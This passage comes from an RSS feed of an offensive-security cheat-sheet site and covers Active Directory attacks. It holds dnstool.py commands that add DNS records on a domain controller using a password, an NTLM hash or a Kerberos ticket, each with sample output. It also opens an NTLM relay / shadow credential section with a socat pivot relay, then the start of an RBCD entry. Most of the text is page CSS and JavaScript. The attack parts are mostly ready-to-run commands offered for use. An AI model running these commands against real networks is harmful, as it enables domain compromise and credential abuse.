&amp;#39;:&amp;lt;HASH&amp;gt;&amp;#39; --action add --record &amp;lt;SUBDOMAIN&amp;gt;.&amp;lt;DOMAIN&amp;gt; --data &amp;lt;LOCAL_IP&amp;gt; &amp;lt;DC_IP&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; python3 dnstool.py -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com\apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;:2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; --action add --record test.example.com --data 10.10.14.31 10.10.143.102&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Connecting to host...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Binding to host&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Bind OK&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Adding new record&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] LDAP operation completed successfully&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;python3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --action add --record &amp;lt;SUBDOMAIN&amp;gt;.&amp;lt;DOMAIN&amp;gt; --data &amp;lt;LOCAL_IP&amp;gt; &amp;lt;DC_IP&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; python3 dnstool.py -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com\apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Connecting to host...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Binding to host&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Bind OK&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Adding new record&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] LDAP operation completed successfully&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;python3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;:&amp;lt;HASH&amp;gt;&amp;#39; -k --action add --record &amp;lt;SUBDOMAIN&amp;gt;.&amp;lt;DOMAIN&amp;gt; --data &amp;lt;LOCAL_IP&amp;gt; &amp;lt;DC_IP&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; python3 dnstool.py -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com\apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;:2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Connecting to host...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Binding to host&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Bind OK&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Adding new record&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] LDAP operation completed successfully&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;python3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -k --action add --record &amp;lt;SUBDOMAIN&amp;gt;.&amp;lt;DOMAIN&amp;gt; --data &amp;lt;LOCAL_IP&amp;gt; &amp;lt;DC_IP&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; python3 dnstool.py -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com\apple.seed&amp;#39;&lt;/span&gt; -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Connecting to host...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Binding to host&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Bind OK&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Adding new record&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] LDAP operation completed successfully&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;small&gt;&lt;em&gt;Ref: &lt;a href=&#34;https://github.com/dirkjanm/krbrelayx&#34;&gt;dnstool.py&lt;/a&gt;&lt;/em&gt;&lt;/small&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>NTLM Relay Attack</title>
      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
      <description>&lt;style&gt;&#xA;:root{&#xA;   &#xA;  --line:     var(--grey-lighten-4, #e6e6e6);&#xA;  --bg:       var(--grey-lighten-5, #f7f7f7);&#xA;  --fg:       var(--grey, #666);&#xA;  --hover-bg: var(--grey-lighten-4, #ececec);&#xA;  --active-bg: white;&#xA;  --active-fg: var(--primary, #6b46c1);&#xA;&#xA;  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);&#xA;  --dm-fg:     #a8a8a8;&#xA;  --dm-hover:  #ae81ff;&#xA;  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-active-fg: #ae81ff;&#xA;}&#xA;&#xA; &#xA;.auth-wrapper {&#xA;  display: flex;&#xA;  justify-content: center;      &#xA;  width: 100%;&#xA;}&#xA;&#xA;.auth-frame {&#xA;  border: 1px solid var(--line);&#xA;  border-radius: 10px;&#xA;  overflow: hidden;&#xA;  width: 100%;&#xA;  max-width: 900px;             &#xA;  background: var(--line);&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid {&#xA;  display: grid;&#xA;  grid-template-columns: 1fr 1fr 1fr;&#xA;  grid-template-rows: auto 1fr 1fr;&#xA;  gap: 1px;                     &#xA;  background: transparent;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;}&#xA;&#xA; &#xA;.cell {&#xA;  background: var(--bg);&#xA;  min-height: 50px;&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  padding: 0;&#xA;  color: var(--fg);&#xA;  transition: background-color .12s ease, color .12s ease;&#xA;}&#xA;&#xA; &#xA;.title {&#xA;  grid-column: 1 / -1;&#xA;  font-weight: 700;&#xA;  font-size: 1.05rem;&#xA;  color: var(--grey-darken-2);&#xA;  background: var(--bg);&#xA;  padding: 10px;&#xA;  text-align: center;&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-ker {&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-all    { grid-row: 2 / 4; grid-column: 1; }&#xA;.cell-pw     { grid-row: 2; grid-column: 2; }&#xA;.cell-ntlm   { grid-row: 3; grid-column: 2; }&#xA;.cell-ker    { grid-row: 2; grid-column: 3; }&#xA;.cell-subs   { grid-row: 3; grid-column: 3; }&#xA;&#xA; &#xA;.btn {&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  background: transparent;&#xA;  border: none;&#xA;  cursor: pointer;&#xA;  font-weight: 700;&#xA;  font-size: 0.9rem;&#xA;  color: inherit;&#xA;  text-align: center;&#xA;  padding: 12px 8px;&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid .cell:hover:not(.has-subrow) {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);  &#xA;}&#xA;.auth-grid .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;.sub-row {&#xA;  display: flex;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  gap: 1px;&#xA;  box-sizing: border-box;&#xA;}&#xA;.sub-item {&#xA;  flex: 1;&#xA;  background: var(--bg);&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  color: var(--fg);&#xA;  transition: background .12s ease, color .12s ease;&#xA;}&#xA;.sub-item .btn { width: 100%; height: 100%; }&#xA;&#xA;.sub-item:hover {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;.sub-item:has(.btn.active) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;body.dark-mode .auth-frame {&#xA;  border-color: var(--dm-line);&#xA;  background: var(--dm-line);&#xA;}&#xA;body.dark-mode .cell,&#xA;body.dark-mode .sub-item {&#xA;  background: var(--dm-bg);&#xA;  color: var(--dm-fg);&#xA;}&#xA;body.dark-mode .title {&#xA;  background: var(--dm-bg);&#xA;  color: #d5d5d5;&#xA;}&#xA;&#xA;body.dark-mode .cell:hover:not(.has-subrow) {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);  &#xA;}&#xA;body.dark-mode .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;body.dark-mode .sub-item:hover {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);&#xA;}&#xA;body.dark-mode .sub-item:has(.btn.active) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;&#xA; &#xA;.highlight.active-block pre {&#xA;  border: 1px solid var(--grey-lighten-3);&#xA;  border-radius: 0.2rem;&#xA;}&#xA;&#xA;.highlight.active-block.codeBlock pre:hover,&#xA;.highlight.active-block.codeBlock-start pre:hover,&#xA;.highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--secondary);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block pre {&#xA;  border-color: var(--grey-darken-4);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block.codeBlock pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-start pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--grey-lighten-1);&#xA;}&#xA;&#xA; &#xA;@media (max-width: 768px) {&#xA;  .auth-grid {&#xA;    grid-template-columns: 1fr;&#xA;    grid-template-rows: auto repeat(5, auto);&#xA;  }&#xA;  .cell-all,&#xA;  .cell-pw,&#xA;  .cell-ntlm,&#xA;  .cell-ker,&#xA;  .cell-subs {&#xA;    grid-row: auto;&#xA;    grid-column: 1;&#xA;  }&#xA;  .sub-row { flex-direction: column; }&#xA;}&#xA;&lt;/style&gt;&#xA;&#xA;&lt;script&gt;&#xA;document.addEventListener(&#34;DOMContentLoaded&#34;, () =&gt; {&#xA;  const buttons = document.querySelectorAll(&#34;.auth-grid .btn&#34;);&#xA;  const filters = [&#34;password&#34;, &#34;ntlm&#34;, &#34;password-based-kerberos&#34;, &#34;ntlm-based-kerberos&#34;, &#34;ticket-based-kerberos&#34;];&#xA;&#xA;  const filterMap = {&#xA;    password: [&#34;password&#34;],&#xA;    ntlm: [&#34;ntlm&#34;],&#xA;    &#34;kerberos-password&#34;: [&#34;password-based-kerberos&#34;],&#xA;    &#34;kerberos-ntlm&#34;: [&#34;ntlm-based-kerberos&#34;],&#xA;    &#34;kerberos-ticket&#34;: [&#34;ticket-based-kerberos&#34;],&#xA;    all: filters,&#xA;  };&#xA;&#xA;  function filterBlocks(filter) {&#xA;    const targetClasses = filterMap[filter] || [];&#xA;    const authClasses = [&#xA;      &#34;password&#34;,&#xA;      &#34;ntlm&#34;,&#xA;      &#34;password-based-kerberos&#34;,&#xA;      &#34;ntlm-based-kerberos&#34;,&#xA;      &#34;ticket-based-kerberos&#34;,&#xA;    ];&#xA;    const blocks = [...document.querySelectorAll(&#34;.highlight&#34;)];&#xA;    const groups = [];&#xA;    let current = [];&#xA;&#xA;    &#xA;    blocks.forEach(block =&gt; {&#xA;      current.push(block);&#xA;      const isEnd = block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      const isStandalone = block.classList.contains(&#34;codeBlock-start&#34;) &amp;&amp; block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      if (isEnd || isStandalone) {&#xA;        groups.push(current);&#xA;        current = [];&#xA;      }&#xA;    });&#xA;    if (current.length) groups.push(current);&#xA;&#xA;    &#xA;    groups.forEach(group =&gt; {&#xA;      const authBlocks = group.filter(b =&gt; authClasses.some(c =&gt; b.classList.contains(c)));&#xA;      if (!authBlocks.length) return; &#xA;&#xA;      &#xA;      if (filter === &#34;all&#34;) {&#xA;        authBlocks.forEach(b =&gt; {&#xA;          b.style.display = &#34;block&#34;;&#xA;          b.classList.remove(&#34;active-block&#34;);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      const matched = authBlocks.filter(b =&gt;&#xA;        targetClasses.some(tc =&gt; b.classList.contains(tc))&#xA;      );&#xA;&#xA;      if (matched.length &gt; 0) {&#xA;        &#xA;        authBlocks.forEach(b =&gt; {&#xA;          const visible = matched.includes(b);&#xA;          b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;          b.classList.toggle(&#34;active-block&#34;, visible);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      let fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;password&#34;));&#xA;      if (fallback.length === 0) {&#xA;        fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;ntlm&#34;));&#xA;      }&#xA;&#xA;      &#xA;      authBlocks.forEach(b =&gt; {&#xA;        const visible = fallback.includes(b);&#xA;        b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;        b.classList.toggle(&#34;active-block&#34;, visible);&#xA;      });&#xA;    });&#xA;  }&#xA;&#xA;  function setActiveButton(btn) {&#xA;    buttons.forEach(b =&gt; b.classList.remove(&#34;active&#34;));&#xA;    btn.classList.add(&#34;active&#34;);&#xA;    const filter = btn.dataset.filter;&#xA;    localStorage.setItem(&#34;authFilter&#34;, filter);&#xA;    filterBlocks(filter);&#xA;  }&#xA;&#xA;  const saved = localStorage.getItem(&#34;authFilter&#34;);&#xA;  const initial = saved &amp;&amp; filterMap[saved] ? saved : &#34;all&#34;;&#xA;  const initBtn = [...buttons].find(b =&gt; b.dataset.filter === initial);&#xA;  initBtn ? setActiveButton(initBtn) : filterBlocks(&#34;all&#34;);&#xA;&#xA;  buttons.forEach(btn =&gt; btn.addEventListener(&#34;click&#34;, () =&gt; setActiveButton(btn)));&#xA;});&#xA;&lt;/script&gt;&#xA;&#xA;&lt;br&gt;&#xA;&#xA;&#xA;&lt;div class=&#34;auth-wrapper&#34;&gt;&#xA;  &lt;div class=&#34;auth-frame&#34;&gt;&#xA;    &lt;div class=&#34;auth-grid&#34;&gt;&#xA;      &lt;div class=&#34;cell title&#34;&gt;Authentication Method&lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-all&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;all&#34;&gt;ALL&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-pw&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;password&#34;&gt;PASSWORD&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ntlm&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;ntlm&#34;&gt;NTLM&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ker&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;kerberos&#34;&gt;KERBEROS&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-subs has-subrow&#34;&gt;&#xA;        &lt;div class=&#34;sub-row&#34;&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-password&#34;&gt;PASSWORD&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-ntlm&#34;&gt;NTLM&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn active&#34; data-filter=&#34;kerberos-ticket&#34;&gt;TICKET&lt;/button&gt;&lt;/div&gt;&#xA;        &lt;/div&gt;&#xA;      &lt;/div&gt;&#xA;    &lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;shadow-credential&#34;&gt;Shadow Credential&lt;/h3&gt;&#xA;&lt;h4 id=&#34;1-redirect-traffic-pivoting-node-optional&#34;&gt;1. Redirect Traffic (Pivoting Node) [Optional]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Upload socat.zip and unzip&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Expand-Archive -Path &amp;#34;&amp;lt;SOCAT_ZIP_FILE_PATH&amp;gt;&amp;#34; -DestinationPath &amp;#34;&amp;lt;DEST_PATH&amp;gt;&amp;#34; -Force&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;PS C:\xampp\htdocs&amp;gt; Expand-Archive -Path &amp;#34;C:\xampp\htdocs\socat.zip&amp;#34; -DestinationPath &amp;#34;C:\xampp\htdocs\&amp;#34; -Force&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;.\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;PS C:\xampp\htdocs\socat-windows-master&amp;gt; .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;      0 [main] socat 2084 find_fast_cwd: WARNING: Couldn&amp;#39;t compute FAST_CWD pointer.  Please report this problem to&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;the public mailing list cygwin@cygwin.com&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;small&gt;&lt;em&gt;Ref: &lt;a href=&#34;https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master&#34;&gt;socat&lt;/a&gt;&lt;/em&gt;&lt;/small&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>RBCD Attack</title>
      <link>https://tldrbins.github.io/rbcd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rbcd/</guid>
      <description>&lt;style&gt;&#xA;:root{&#xA;   &#xA;  --line:     var(--grey-lighten-4, #e6e6e6);&#xA;  --bg:       var(--grey-lighten-5, #f7f7f7);&#xA;  --fg:       var(--grey, #666);&#xA;  --hover-bg: var(--grey-lighten-4, #ececec);&#xA;  --active-bg: white;&#xA;  --active-fg: var(--primary, #6b46c1);&#xA;&#xA;  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);&#xA;  --dm-fg:     #a8a8a8;&#xA;  --dm-hover:  #ae81ff;&#xA;  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-active-fg: #ae81ff;&#xA;}&#xA;&#xA; &#xA;.auth-wrapper {&#xA;  display: flex;&#xA;  justify-content: center;      &#xA;  width: 100%;&#xA;}&#xA;&#xA;.auth-frame {&#xA;  border: 1px solid var(--line);&#xA;  border-radius: 10px;&#xA;  overflow: hidden;&#xA;  width: 100%;&#xA;  max-width: 900px;             &#xA;  background: var(--line);&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid {&#xA;  display: grid;&#xA;  grid-template-columns: 1fr 1fr 1fr;&#xA;  grid-template-rows: auto 1fr 1fr;&#xA;  gap: 1px;                     &#xA;  background: transparent;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;}&#xA;&#xA; &#xA;.cell {&#xA;  background: var(--bg);&#xA;  min-height: 50px;&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  padding: 0;&#xA;  color: var(--fg);&#xA;  transition: background-color .12s ease, color .12s ease;&#xA;}&#xA;&#xA; &#xA;.title {&#xA;  grid-column: 1 / -1;&#xA;  font-weight: 700;&#xA;  font-size: 1.05rem;&#xA;  color: var(--grey-darken-2);&#xA;  background: var(--bg);&#xA;  padding: 10px;&#xA;  text-align: center;&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-ker {&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-all    { grid-row: 2 / 4; grid-column: 1; }&#xA;.cell-pw     { grid-row: 2; grid-column: 2; }&#xA;.cell-ntlm   { grid-row: 3; grid-column: 2; }&#xA;.cell-ker    { grid-row: 2; grid-column: 3; }&#xA;.cell-subs   { grid-row: 3; grid-column: 3; }&#xA;&#xA; &#xA;.btn {&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  background: transparent;&#xA;  border: none;&#xA;  cursor: pointer;&#xA;  font-weight: 700;&#xA;  font-size: 0.9rem;&#xA;  color: inherit;&#xA;  text-align: center;&#xA;  padding: 12px 8px;&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid 